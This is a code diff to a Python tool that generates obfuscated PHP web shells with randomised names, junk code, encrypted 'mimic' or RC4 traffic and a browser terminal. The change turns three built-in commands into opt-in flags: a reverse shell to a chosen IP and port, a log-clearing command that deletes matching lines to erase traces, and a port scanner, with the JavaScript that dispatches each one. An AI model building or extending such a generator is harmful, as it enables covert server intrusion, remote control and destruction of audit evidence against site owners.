@@ -581,7 +581,7 @@ def pick(pool, used, rng):
 def build_php_section(n, jv, ids, route_param, routes, session_key_val,
                       bcrypt_hash, username, junk_before, junk_after,
                       case_order, theme, ver, rng,
-                      transport, transport_ctx):
+                      transport, transport_ctx, features):
     if theme == 'poly':
         T = generate_poly_theme(rng)
     elif theme == 'none':
@@ -603,6 +603,42 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
     p_pattern  = transport_ctx['p_pattern']
     p_target   = transport_ctx['p_target']
     p_ports_ps = transport_ctx['p_ports_ps']
+
+    # ── Feature-gated JS interceptors ──
+    jfn = jv  # alias used throughout f-string template
+    _js_interceptors = []
+    if features.get('revshell'):
+        _js_interceptors.append(
+            f"            var _rsm = command.match(/^\\s*revshell\\s+(\\S+)\\s+(\\d+)\\s*$/i);\n"
+            f"            if (_rsm) {{\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['revshell']}\", {{{p_ip}: _rsm[1], {p_port_rs}: _rsm[2]}}, function(r) {{\n"
+            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
+            f"                }});\n"
+            f"                return;\n"
+            f"            }}"
+        )
+    if features.get('clearlog'):
+        _js_interceptors.append(
+            f"            var _clm = command.match(/^\\s*clearlog\\s+(\\S+)\\s+(.+?)\\s*$/i);\n"
+            f"            if (_clm) {{\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['clearlog']}\", {{{p_logfile}: _clm[1], {p_pattern}: _clm[2]}}, function(r) {{\n"
+            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
+            f"                }});\n"
+            f"                return;\n"
+            f"            }}"
+        )
+    if features.get('portscan'):
+        _js_interceptors.append(
+            f"            var _psm = command.match(/^\\s*portscan\\s+(\\S+)\\s+(\\S+)\\s*$/i);\n"
+            f"            if (_psm) {{\n"
+            f"                {jfn['insert_stdout']}(\"Scanning...\");\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['portscan']}\", {{{p_target}: _psm[1], {p_ports_ps}: _psm[2]}}, function(r) {{\n"
+            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
+            f"                }});\n"
+            f"                return;\n"
+            f"            }}"
+        )
+    js_feature_interceptors = ("\n" + "\n".join(_js_interceptors)) if _js_interceptors else ""
 
     if transport == 'plain':
         def pdec(param, fallback=None):
@@ -974,7 +1010,6 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
         decoy_js_vars += f"            var {vname} = {vval};\n"
 
     # ── JS functions ──
-    jfn = jv
 
     php_output = f"""<?php
 
@@ -1355,28 +1390,7 @@ if (isset($_GET['{route_param}'])) {{
         function {jfn['resolve_task']}(command) {{
             if (typeof command !== "string" || !command.trim()) return;
             {jfn['append_line']}(command);
-            var _rsm = command.match(/^\\s*revshell\\s+(\\S+)\\s+(\\d+)\\s*$/i);
-            if (_rsm) {{
-                {jfn['pipe_call']}("?{route_param}={routes['revshell']}", {{{p_ip}: _rsm[1], {p_port_rs}: _rsm[2]}}, function(r) {{
-                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
-                }});
-                return;
-            }}
-            var _clm = command.match(/^\\s*clearlog\\s+(\\S+)\\s+(.+?)\\s*$/i);
-            if (_clm) {{
-                {jfn['pipe_call']}("?{route_param}={routes['clearlog']}", {{{p_logfile}: _clm[1], {p_pattern}: _clm[2]}}, function(r) {{
-                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
-                }});
-                return;
-            }}
-            var _psm = command.match(/^\\s*portscan\\s+(\\S+)\\s+(\\S+)\\s*$/i);
-            if (_psm) {{
-                {jfn['insert_stdout']}("Scanning...");
-                {jfn['pipe_call']}("?{route_param}={routes['portscan']}", {{{p_target}: _psm[1], {p_ports_ps}: _psm[2]}}, function(r) {{
-                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
-                }});
-                return;
-            }}
+{js_feature_interceptors}
             var m = command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/);
             if (m) {{ {jfn['trigger_export']}(m[1]); return; }}
             if (/^\\s*clear\\s*$/.test(command)) {{ {jfn['e_content']}.innerHTML = ''; return; }}
@@ -1593,8 +1607,14 @@ def generate(args):
     junk_before = all_junk[:mid]
     junk_after  = all_junk[mid:]
 
-    # Case order
-    case_order = ['shell','pwd','hint','upload','revshell','clearlog','portscan']
+    # Case order — optional features compiled in only if explicitly requested
+    case_order = ['shell', 'pwd', 'hint', 'upload']
+    if args.revshell:
+        case_order.append('revshell')
+    if args.clearlog:
+        case_order.append('clearlog')
+    if args.portscan:
+        case_order.append('portscan')
     rng.shuffle(case_order)
 
     # Version
@@ -1603,11 +1623,17 @@ def generate(args):
     # Transport context (param names + optional crypto keys)
     transport_ctx = generate_transport_context(rng, args.transport)
 
+    features = {
+        'revshell': args.revshell,
+        'clearlog': args.clearlog,
+        'portscan': args.portscan,
+    }
+
     return build_php_section(
         n, jv, ids, route_param, routes, session_key_val,
         bcrypt_hash, args.user, junk_before, junk_after,
         case_order, theme, ver, rng,
-        args.transport, transport_ctx
+        args.transport, transport_ctx, features
     )
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1646,6 +1672,12 @@ Examples:
                         help='Disable junk function generation')
     parser.add_argument('--transport', choices=['plain','mimic','rc4'], default='plain',
                         help='AJAX traffic encoding — plain: no encoding (default); mimic: standard base64 with random param names; rc4: RC4 + per-build shuffled base64 alphabet')
+    parser.add_argument('--revshell', action='store_true', default=False,
+                        help='Compile revshell command into the shell (opt-in; not included by default)')
+    parser.add_argument('--clearlog', action='store_true', default=False,
+                        help='Compile clearlog command into the shell (opt-in; not included by default)')
+    parser.add_argument('--portscan', action='store_true', default=False,
+                        help='Compile portscan command into the shell (opt-in; not included by default)')
     args = parser.parse_args()
 
     if args.junk is not None and (args.junk < 0 or args.junk > 200):
